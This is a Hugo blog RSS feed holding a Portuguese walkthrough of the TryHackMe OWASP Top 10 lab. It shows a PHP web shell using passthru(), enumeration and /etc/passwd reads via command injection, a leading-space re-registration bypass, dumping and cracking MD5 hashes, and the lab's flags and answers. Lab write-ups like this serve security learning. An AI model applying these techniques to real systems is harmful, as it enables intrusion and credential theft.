@@ -1,0 +1,798 @@
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Alex Paulino – Owasp</title>
+    <link>http://localhost:1313/tags/owasp/</link>
+    <description>Recent content in Owasp on Alex Paulino</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>pt</language>
+    <lastBuildDate>Sun, 05 Jan 2025 10:44:00 -0300</lastBuildDate>
+    
+	  <atom:link href="http://localhost:1313/tags/owasp/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+      
+        
+      
+    
+    
+    <item>
+      <title>OWASP Top 10 - THM</title>
+      <link>http://localhost:1313/posts/2025/2025-01-17-owasptop10-2020/</link>
+      <pubDate>Sun, 05 Jan 2025 10:44:00 -0300</pubDate>
+      
+      <guid>http://localhost:1313/posts/2025/2025-01-17-owasptop10-2020/</guid>
+      <description>
+        
+        
+        &lt;h2 data-hextra-search-id=&#34;introdução&#34;&gt;Introdução&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;introdução&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#introdu%c3%a7%c3%a3o&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Nesta aula, são ensinados os métodos para explorar cada vulnerabilidade do OWASP Top 10. Documentarei e detalharei as etapas de cada uma das vulnerabilidades mencionadas na aula.&lt;/p&gt;
+&lt;p&gt;Para acessar a aula &lt;a
+    href=&#34;https://tryhackme.com/r/room/owasptop10&#34;target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;clique aqui OWASP TOP 10&lt;/a&gt;&lt;/p&gt;
+&lt;h2 data-hextra-search-id=&#34;injeção&#34;&gt;Injeção&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;injeção&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#inje%c3%a7%c3%a3o&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;É uma vulnerabilidade comum nas aplicações atuais. A falha ocorre porque a entrada de dados enviada pelo usuário é interpretada como comandos ou parâmetros, sem validação ou sanitização dos dados enviados. Assim, o atacante pode executar comandos arbitrários no sistema, como acessar, modificar e até mesmo deletar informações contidas no servidor. Exemplos de códigos podem ser injetados.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;SQL Injection&lt;/li&gt;
+&lt;li&gt;Command Injection&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;A injeção de comando ocorre do lado do servidor. A aplicação realiza uma chamada de sistema, e nesse momento o atacante toma vantagem. Com a utilização do caracter &lt;code&gt;;&lt;/code&gt; antes dos comandos, o atacante pode quebrar a aplicação e executar os comandos que deseja. No exemplo a seguir, não é necessária a utilização do &lt;code&gt;;&lt;/code&gt;.&lt;/p&gt;
+&lt;h3 data-hextra-search-id=&#34;command-injection&#34;&gt;Command Injection&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;command-injection&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#command-injection&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Existem dois tipos de injeção de comandos: ativa, onde a aplicação retorna visualmente no HTML da página a resposta do nosso comando; e a injeção às cegas, onde não recebemos no HTML uma resposta da aplicação.&lt;/p&gt;
+&lt;p&gt;No primeiro exemplo, temos um host que possui um web shell disponível na internet. Abaixo, está o código PHP da aplicação.&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;isset&lt;/span&gt;($_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;commandString&amp;#34;&lt;/span&gt;])) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	$command_string &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;commandString&amp;#34;&lt;/span&gt;];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;passthru&lt;/span&gt;($command_string);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	} &lt;span style=&#34;color:#66d9ef&#34;&gt;catch&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;Error&lt;/span&gt; $error) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;lt;p class=mt-3&amp;gt;&amp;lt;b&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$error&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;lt;/b&amp;gt;&amp;lt;/p&amp;gt;&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copiar código&#34;
+    aria-label=&#34;Copiar código&#34;
+    data-copied-label=&#34;Copiado!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;O código acima verifica se o comando passado é válido. Caso seja, exibe o resultado na tela; caso contrário, a aplicação não retorna nada.&lt;/p&gt;
+&lt;p&gt;Como mencionado na aula, primeiro precisamos enumerar nosso host e descobrir qual é seu sistema operacional: Windows ou Linux. Podemos descobrir isso facilmente executando comandos em cada sistema.&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Linux
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	- whoami
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	- id
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	- ifconfig/ip addr
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	- uname -a
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	- ps -ef
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Windows
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	- whoami
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	- ver
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	- ipconfig
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	- tasklist
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	- netstat -an&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copiar código&#34;
+    aria-label=&#34;Copiar código&#34;
+    data-copied-label=&#34;Copiado!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;h4 data-hextra-search-id=&#34;perguntas&#34;&gt;Perguntas&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;perguntas&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#perguntas&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;What strange text file is in the website root directory?&lt;/strong&gt;&lt;br&gt;
+Com o comando &lt;code&gt;ls&lt;/code&gt; listamos os arquivos no diretório atual
+Resposta: &lt;code&gt;drpepper.txt&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/01/OWASPTOP10/OWASPTOP10-LS.webp&#34; alt=&#34;drpepper&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;How many non-root/non-service/non-daemon users are there?&lt;/strong&gt;&lt;br&gt;
+Para saber a quantidade precisamos olhar o arquivo &lt;code&gt;/etc/passwd&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/01/OWASPTOP10/OWASPTOP10-PASSWD.webp&#34; alt=&#34;passwd&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;Syslog&lt;/code&gt; é um serviço, podemos filtrar também por &lt;code&gt;x:100&lt;/code&gt;, no caso não temos nenhum usuário no host.&lt;br&gt;
+Resposta: &lt;code&gt;0&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;What user is this app running as?&lt;/strong&gt;&lt;br&gt;
+Com o comando &lt;code&gt;id&lt;/code&gt; descobrimos qual usuário está executando nossos comandos.&lt;br&gt;
+Resposta: &lt;code&gt;www-data&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;What is the user&amp;rsquo;s shell set as?&lt;/strong&gt;&lt;br&gt;
+Com o comando &lt;code&gt;grep &amp;quot;www-data&amp;quot; /etc/passwd&lt;/code&gt; descobrimos qual é a shell do usuário.&lt;br&gt;
+Resposta:&lt;code&gt;/usr/sbin/nologin&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;What version of Ubuntu is running?&lt;/strong&gt;&lt;br&gt;
+Comando para descobrir &lt;code&gt;lsb_release -a&lt;/code&gt;.&lt;br&gt;
+Resposta:&lt;code&gt;18.04.4&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Print out the MOTD.  What favorite beverage is shown?&lt;/strong&gt;&lt;br&gt;
+MOTD significa: &lt;code&gt;message of the day&lt;/code&gt;.&lt;br&gt;
+Pesquisando na documentação &lt;code&gt;man motd&lt;/code&gt; não encontramos o arquivo &lt;code&gt;/etc/motd&lt;/code&gt;, sendo assim vamos utilizar um comando para localizar todos os arquivos com o nome de &lt;code&gt;motd&lt;/code&gt;.
+O retorno do comando trás diversos arquivos, com a dica da questão sabemos qual arquivo devemos verificar.&lt;/p&gt;
+&lt;p&gt;Arquivo:&lt;code&gt;/etc/update-motd.d/00-header&lt;/code&gt;.&lt;br&gt;
+Nossa resposta está no final do arquivo.&lt;br&gt;
+Resposa:&lt;code&gt;Dr Pepper&lt;/code&gt;&lt;/p&gt;
+&lt;h2 data-hextra-search-id=&#34;autenticação-quebrada&#34;&gt;Autenticação quebrada&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;autenticação-quebrada&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#autentica%c3%a7%c3%a3o-quebrada&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Autenticação e gerenciamento de sessão são as bases das aplicações modernas. Autenticamos em uma aplicação e nos mantemos conectados, respectivamente. A autenticação, tradicionalmente, é feita com usuário e senha; já o gerenciamento da sessão é realizado através de cookies de sessão. Como o protocolo HTTPS não mantém informações da sessão (&lt;em&gt;stateless&lt;/em&gt;), o cookie possui um papel importante, fornecendo informações e mantendo a autenticação do usuário com o servidor.&lt;/p&gt;
+&lt;p&gt;O atacante que consegue explorar essa falha tem a possibilidade de acessar outras contas de usuários. Abaixo, algumas falhas comuns em mecanismos de autenticação:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Brute force:&lt;/strong&gt; se a aplicação usa usuário e senha, e não possui um mecanismo que mitigue o ataque, é possível tentar adivinhar as credenciais.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Credenciais fracas:&lt;/strong&gt; se a aplicação usa senhas fracas, comuns, por exemplo &lt;code&gt;password1&lt;/code&gt;, o atacante pode facilmente adivinhar a senha, sem precisar utilizar diversas tentativas.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Cookies de sessão fracos:&lt;/strong&gt; se o cookie possui valores fáceis de prever, o atacante pode forjar um cookie falso e também realizar a troca de usuário.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Abaixo, as formas para mitigar esses tipos de ataque:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Criar controles:&lt;/strong&gt; controles que mitiguem o uso excessivo em um curto espaço de tempo para tentativas de acesso.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Política de criação de senha.&lt;/strong&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Implementação de multi-fator de autenticação.&lt;/strong&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;I&amp;rsquo;ve understood broken authentication mechanisms.&lt;/strong&gt;&lt;br&gt;
+Não é necessário resposta.&lt;/p&gt;
+&lt;h3 data-hextra-search-id=&#34;prática&#34;&gt;Prática&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;prática&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#pr%c3%a1tica&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;No exercício, é fornecida uma aplicação que não realiza as devidas validações no registro de usuário. Quando tentamos criar um novo usuário, é verificado se o usuário já existe. Caso exista, a seguinte mensagem é mostrada:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;# Error: This user is already registered&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Dessa forma, conseguimos enumerar os usuários na aplicação. A vulnerabilidade ocorre quando informamos, no registro de usuário, um espaço no início do nome. A aplicação não realiza as devidas validações e, com isso, conseguimos re-registrar o mesmo usuário na aplicação, porém agora com a senha que criamos no momento do cadastro, exemplo a seguir:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/01/OWASPTOP10/OWASPTOP10-AUTH.webp&#34; alt=&#34;darren&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Após re-registrar o usuário  &amp;ldquo;&lt;code&gt; darren&lt;/code&gt;&amp;rdquo;, conseguimos realizar o login e obtemos a resposta para primeira pergunta da tarefa.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;What is the flag that you found in darren&amp;rsquo;s account?&lt;/strong&gt;&lt;br&gt;
+Resposta: &lt;code&gt;fe86079416a21a3c99937fea8874b667&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Now try to do the same trick and see if you can login as arthur.&lt;/strong&gt;&lt;br&gt;
+Não é necessário resposta.&lt;/p&gt;
+&lt;h2 data-hextra-search-id=&#34;exposição-de-dados-sensíveis&#34;&gt;Exposição de dados sensíveis&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;exposição-de-dados-sensíveis&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#exposi%c3%a7%c3%a3o-de-dados-sens%c3%adveis&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Quando uma aplicação divulga acidentalmente dados confidenciais, isso é chamado de &amp;ldquo;Exposição de dados sensíveis&amp;rdquo;. Esses dados são facilmente cruzados com os clientes.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Read the introduction to Sensitive Data Exposure and deploy the machine.&lt;/strong&gt;&lt;br&gt;
+Resposta: não é necessário responder.&lt;/p&gt;
+&lt;h3 data-hextra-search-id=&#34;banco-de-dados&#34;&gt;Banco de dados&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;banco-de-dados&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#banco-de-dados&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Aplicações web precisam de soluções que suportem uma grande quantidade de dados e que sejam em formato acessível. Normalmente, esses dados são armazenados em bancos de dados que utilizam SQL e, em alguns casos, NoSQL. É comum ver servidores dedicados para bancos de dados, rodando MariaDB e MySQL. Outra forma de armazenamento dos dados é feita em um único arquivo chamado &lt;code&gt;flat file database&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Uma &lt;strong&gt;Flat File Database&lt;/strong&gt; é um tipo de banco de dados simples que armazena informações em um único arquivo de texto, sem a necessidade de um sistema de gerenciamento de banco de dados complexo. Os dados são organizados em linhas e colunas, semelhante a uma planilha.&lt;/p&gt;
+&lt;p&gt;No exemplo da tarefa, é mostrado o acesso a um &lt;code&gt;flat file database&lt;/code&gt; usando SQLite 3. Nele, são verificadas as informações da tabela (&lt;code&gt;PRAGMA table_info(customers);&lt;/code&gt;) e feito o dump das informações (&lt;code&gt;SELECT * FROM customers;&lt;/code&gt;).&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/01/OWASPTOP10/OWASPTOP10-EXPOSURE-INFORMATION-1.webp&#34; alt=&#34;exposicao dados&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Read and understand the supporting material on SQLite Databases.&lt;/strong&gt;&lt;br&gt;
+Resposta: não é necessário responder.&lt;/p&gt;
+&lt;h3 data-hextra-search-id=&#34;quebra-de-hash&#34;&gt;Quebra de hash&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;quebra-de-hash&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#quebra-de-hash&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;No exemplo anterior, conseguimos obter as hashes dos usuários. Como mencionado na tarefa, não utilizaremos as ferramentas disponíveis no Kali. Em vez disso, usaremos uma ferramenta online disponível chamada &lt;a
+    href=&#34;https://crackstation.net/&#34;target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Crackstation&lt;/a&gt;. O escopo da tarefa não inclui descobrir qual é o algoritmo de hash utilizado, pois já foi informado que é (md5) e, além disso, já sabemos que as hashes são facilmente quebradas.&lt;/p&gt;
+&lt;p&gt;A hash do usuário &lt;code&gt;Joy Paulson&lt;/code&gt; será utilizada:
+&lt;code&gt;5f4dcc3b5aa765d61d8327deb882cf99&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/01/OWASPTOP10/OWASPTOP10-CRACKSTATION-1.webp&#34; alt=&#34;crackstation&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Com isso, a senha do usuário é descoberta. Como mencionado na tarefa, a ferramenta utiliza uma vasta lista de senhas. Caso a senha da hash não seja descoberta, possivelmente essa hash foi criada para não ser quebrada.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Read the supporting material about cracking hashes.&lt;/strong&gt;&lt;br&gt;
+Resposta: não é necessário responder.&lt;/p&gt;
+&lt;h4 data-hextra-search-id=&#34;desafio&#34;&gt;Desafio&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;desafio&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#desafio&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;Have a look around the webapp. The developer has left themselves a note indicating that there is sensitive data in a specific directory.&lt;/strong&gt;&lt;br&gt;
+&lt;strong&gt;What is the name of the mentioned directory?&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;A página inicial da aplicação não possui informações importantes para nós, conforme mostra a imagem.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/01/OWASPTOP10/OWASPTOP10-CHALLENGES-1.webp&#34; alt=&#34;pagina inicial&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Na página de login não temos muitas informações, analisando o código fonte temos os caminhos para os &lt;code&gt;.css&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;href=&amp;#34;../assets/css/style.css
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;href=&amp;#34;../assets/css/loginStyle.css
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;href=&amp;#34;../assets/css/orkney.css
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;href=&amp;#34;../assets/css/icons.css&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copiar código&#34;
+    aria-label=&#34;Copiar código&#34;
+    data-copied-label=&#34;Copiado!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;Conseguimos realizar listagem de diretório e dentro do diretório &lt;code&gt;assets&lt;/code&gt; temos um arquivo sensível: &lt;code&gt;webapp.db&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/01/OWASPTOP10/OWASPTOP10-CHALLENGES-1-1.webp&#34; alt=&#34;webapp.db&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Resposta:&lt;code&gt;/assets&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Navigate to the directory you found in question one. What file stands out as being likely to contain sensitive data?&lt;/strong&gt;&lt;br&gt;
+Reposta:&lt;code&gt;webapp.db&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Use the supporting material to access the sensitive data. What is the password hash of the admin user?&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Primeiro, devemos realizar o download do arquivo para nossa máquina local. Após isso, verificamos que se trata de um arquivo de banco de dados. Acessamos os dados contidos no arquivo e realizamos o dump das informações sensíveis.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/01/OWASPTOP10/OWASPTOP10-CHALLENGES-3.webp&#34; alt=&#34;dump&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Resposta:&lt;code&gt;6eea9b7ef19179a06954edd0f6c05ceb&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Crack the hash.&lt;/strong&gt;&lt;br&gt;
+&lt;strong&gt;What is the admin&amp;rsquo;s plaintext password?&lt;/strong&gt;&lt;br&gt;
+Resposta:&lt;code&gt;qwertyuiop&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Login as the admin. What is the flag?&lt;/strong&gt;&lt;br&gt;
+Resposta: &lt;code&gt;THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}&lt;/code&gt;&lt;/p&gt;
